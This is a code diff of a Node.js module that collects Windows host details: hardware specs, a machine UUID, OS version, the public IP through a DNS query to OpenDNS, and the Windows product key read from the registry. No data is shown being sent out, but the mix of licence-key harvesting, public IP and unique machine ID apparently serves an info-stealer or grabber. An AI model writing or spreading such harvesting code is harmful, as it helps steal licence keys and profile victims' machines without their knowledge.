@@ -1,16 +1,10 @@
-const fetch = require('sync-fetch');
 const util = require("util");
 const exec = util.promisify(require("child_process").exec);
 
 async function getDisk() {
     try {
-        const size = (await getCommand("wmic logicaldisk get size")).split(" ");
-        for (let item of size) {
-            if (item.trim() !== "" && item.trim().toLowerCase() !== "size") {
-                return Math.floor(parseInt(item) / (1024 * 1024 * 1024)).toString();
-            }
-        }
-        return "1000";
+        const size = (await getCommand("wmic logicaldisk get size")).split(" ").filter(item => item.trim() !== "" && item.trim().toLowerCase() !== "size");
+        return size.length > 0 ? Math.floor(parseInt(size[0]) / (1024 * 1024 * 1024)).toString() : "1000";
     } catch (err) {
         console.error(err);
         return "1000";
@@ -19,9 +13,7 @@ async function getDisk() {
 
 async function getTotalMemory() {
     try {
-        const tpm = await getCommand(
-            "wmic computersystem get totalphysicalmemory | more +1"
-        );
+        const tpm = await getCommand("wmic computersystem get totalphysicalmemory | more +1");
         return parseInt(Math.floor(parseInt(tpm) / (1024 * 1024 * 1024)));
     } catch (err) {
         console.error(err);
@@ -53,7 +45,7 @@ async function getCommand(cmd) {
 
 async function getCpuCount() {
     try {
-        const { stdout } = await getCommand("echo %NUMBER_OF_PROCESSORS%");
+        const stdout = await getCommand("echo %NUMBER_OF_PROCESSORS%");
         const cpuCount = parseInt(stdout);
         return isNaN(cpuCount) ? "4" : cpuCount.toString();
     } catch (err) {
@@ -64,18 +56,19 @@ async function getCpuCount() {
 
 async function getInfo() {
     try {
-        const [ disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion ] = await Promise.all([
+        const [ disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion ] = await Promise.all([
             getDisk(),
             getTotalMemory(),
             getCleanUUID(),
             getCpuCount(),
+            getCommand("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"),
             getCommand("wmic OS get caption, osarchitecture | more +1"),
             getCommand("wmic cpu get name | more +1"),
             getCommand("wmic PATH Win32_VideoController get name | more +1"),
             getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"),
             getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
         ]);
-        return { disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion };
+        return { disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion }
     } catch (err) {
         console.error(err);
         return {
@@ -92,17 +85,6 @@ async function getInfo() {
     }
 }
 
-async function getPublicIp() {
-    try {
-        const r = fetch('https://ipinfo.io/json');
-        const _ = r.json();
-        return _.length > 16 ? "Not found" : _;
-    } catch (err) {
-        return "Not found";
-    }
-}
-
 module.exports = {
-    getPublicIp,
     getInfo,
 };
